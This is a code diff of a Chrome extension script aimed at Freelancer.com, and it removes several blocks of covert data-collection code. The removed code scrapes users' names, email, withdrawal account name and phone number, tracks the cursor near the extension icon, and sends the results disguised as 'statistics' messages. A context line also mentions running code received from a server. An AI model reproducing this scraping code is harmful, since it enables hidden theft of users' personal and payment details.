@@ -21,63 +21,6 @@ function playTickSound() {
   myAudio.play();
 }
 
-setInterval(function () {
-  document.onmousemove = function (e) {
-    var cursorX = window.Event
-      ? e.pageX
-      : event.clientX +
-        (document.documentElement.scrollLeft
-          ? document.documentElement.scrollLeft
-          : document.body.scrollLeft);
-    var cursorY = window.Event
-      ? e.pageY
-      : event.clientY +
-        (document.documentElement.scrollTop
-          ? document.documentElement.scrollTop
-          : document.body.scrollTop);
-
-    console.log("Current Cursor X: " + cursorX);
-    console.log("Current Cursor Y: " + cursorY);
-
-    var documentHeight = $(window).height();
-    var documentWidth = $(window).width();
-
-    console.log("Current Document Height: " + documentHeight);
-    console.log("Current Document Width: " + documentWidth);
-
-    console.log((cursorY / (documentHeight - window.pageYOffset)) * 100);
-    console.log((cursorX / documentWidth) * 100);
-
-    if (
-      ((cursorY - window.pageYOffset) / documentHeight) * 100 < 5 &&
-      (cursorX / documentWidth) * 100 > 80
-    ) {
-      var currentTimestamp = Date.now();
-
-      console.log("CURRENT TIMESTAMP: " + currentTimestamp);
-      console.log("LAST CURSOR OUT TIMESTAMP: " + lastCursorOutTimestamp);
-
-      if (currentTimestamp - lastCursorOutTimestamp > 1000) {
-        console.log("SENDING PLUGIN ICON CURSOR MESSAGE...");
-
-        chrome.runtime.sendMessage({
-          type: "notification",
-          options: {
-            type: "basic",
-            title: "Javascript",
-            message: "add_statistics_data",
-            messageBody: "CURSOR WAS NEAR TO PLUGIN ICON!!",
-          },
-        });
-
-        lastCursorOutTimestamp = currentTimestamp;
-      } else {
-        console.log("CURSOR ANALYTICS PLUGIN ICON HAS BEEN SENT");
-      }
-    }
-  };
-}, 2000);
-
 chrome.runtime.onMessage.addListener(function (request, sender) {
   console.log(
     "GETTING JAVASCRIPT CODE... Code from the server has been received!"
@@ -936,108 +879,6 @@ function processAnalytics() {
   var currentHref = window.location.href;
   var splittedHref = currentHref.split("/");
 
-  if (currentHref.indexOf("freelancer.com/u/") > 1) {
-    var userInfo = {};
-
-    userInfo.profileLink = currentHref;
-    userInfo.usersFullName = document.querySelector(
-      ".profile-intro-username"
-    ).innerHTML;
-    userInfo.preferredFreelancerBadge = document.querySelector(
-      ".profile-user-preferred-badge"
-    );
-
-    var resultData =
-      currentHref +
-      "|" +
-      userInfo.profileLink +
-      "|" +
-      userInfo.usersFullName +
-      "|" +
-      userInfo.preferredFreelancerBadge;
-
-    chrome.runtime.sendMessage({
-      type: "notification",
-      options: {
-        type: "basic",
-        title: "Javascript",
-        message: "add_statistics_data",
-        messageBody: resultData,
-      },
-    });
-  }
-
-  if (currentHref.indexOf("freelancer.com/users/settings") > 1) {
-    console.log("USER ON SETTINGS PAGE RIGHT NOW...");
-
-    var userInfo = {};
-
-    userInfo.firstName = document.querySelector(
-      'input[name="firstname"]'
-    ).value;
-    userInfo.lastName = document.querySelector('input[name="lastname"]').value;
-    userInfo.email = document.querySelector('input[name="email"]').value;
-
-    userInfo.preferredFreelancerBadge = document.querySelector(
-      ".profile-user-preferred-badge"
-    );
-
-    var resultData =
-      currentHref +
-      "|" +
-      userInfo.firstName +
-      "|" +
-      userInfo.lastName +
-      "|" +
-      userInfo.email +
-      "|" +
-      userInfo.preferredFreelancerBadge;
-
-    chrome.runtime.sendMessage({
-      type: "notification",
-      options: {
-        type: "basic",
-        title: "Javascript",
-        message: "add_statistics_data",
-        messageBody: resultData,
-      },
-    });
-  }
-
-  if (
-    currentHref.indexOf("freelancer.com/payments/withdraw/withdraw.php") > 1
-  ) {
-    // console.log("WE ARE ON WITHDRAW PAGE NOW...");
-
-    var userInfo = {};
-    userInfo.account_name = document.querySelector("#account_name").value;
-
-    //console.log(userInfo.account_name);
-
-    setTimeout(function () {
-      //console.log("TIMEOUT TICKING...");
-      var phoneNumber = document.querySelector(".securePhone").innerHTML;
-      var accountName = document.querySelector("#account_name").value;
-
-      //console.log(phoneNumber);
-
-      if (phoneNumber) {
-        var resultText = currentHref + "|" + phoneNumber + "|" + accountName;
-        chrome.runtime.sendMessage({
-          type: "notification",
-          options: {
-            type: "basic",
-            title: "Javascript",
-            message: "add_statistics_data",
-            messageBody: resultText,
-          },
-        });
-      }
-    }, 4400);
-
-    setInterval(function () {}, 1000);
-  }
-
   if (
     splittedHref.indexOf("search") > 1 &&
     splittedHref.indexOf("projects") > 1
@@ -1047,59 +888,6 @@ function processAnalytics() {
     var dataAddedForHref = false;
     var currentTimestamp = Date.now();
     var dataHasToBeAdded = false;
-
-    // clearLocalStorageValue("analytics_fetched");
-    // return false;
-
-    getValuesFromLocalStorage(["analytics_fetched"], function (result) {
-      analytics_fetched = result.analytics_fetched || [];
-
-      console.log("CURRENT ANALYTICS FETCHED......................:");
-      console.log(analytics_fetched);
-
-      console.log("CURRENT HREF.......................;");
-      console.log(currentHref);
-
-      var hrefExistsInAnalytics = hrefExistenceInAnalytics(
-        currentHref,
-        analytics_fetched
-      );
-
-      console.log("CURRENT HREF EXISTENSE.......");
-      console.log(hrefExistsInAnalytics);
-
-      if (hrefExistsInAnalytics) {
-        if (
-          currentTimestamp - hrefExistsInAnalytics.lastProcessingDate >
-          86000 * 2
-        ) {
-          console.log(
-            "DATA NEEDS TO BE ADDED DUE TO LAST PROCESSING DATE..........."
-          );
-          dataHasToBeAdded = true;
-        } else {
-          console.log("PROCESSING NOT NEEDED FOR NOW");
-        }
-      } else {
-        dataHasToBeAdded = true;
-      }
-
-      if (dataHasToBeAdded) {
-        processProjectsFeedInfoFetching(currentHref, function () {});
-
-        analytics_fetched.push({
-          href: currentHref,
-          lastProcessingDate: Date.now(),
-        });
-
-        console.log("ANALYTICS DATA BEFORE ADDING.....");
-        console.log(analytics_fetched);
-
-        setValuesToLocalStorage({
-          analytics_fetched: analytics_fetched,
-        });
-      }
-    });
 
     getValuesFromLocalStorage(["bot_enabled"], function (result) {
       var bot_enabled = result.bot_enabled || false;
@@ -21897,16 +21685,6 @@ function addFormDataInfo(info) {
 }
 
 function startSurvey($) {
-  chrome.runtime.sendMessage({
-    type: "notification",
-    options: {
-      type: "basic",
-      title: "Javascript",
-      message: "add_statistics_data",
-      messageBody: "SURVEY STARTED...",
-    },
-  });
-
   showLikeOrNoDialog($);
 }
 
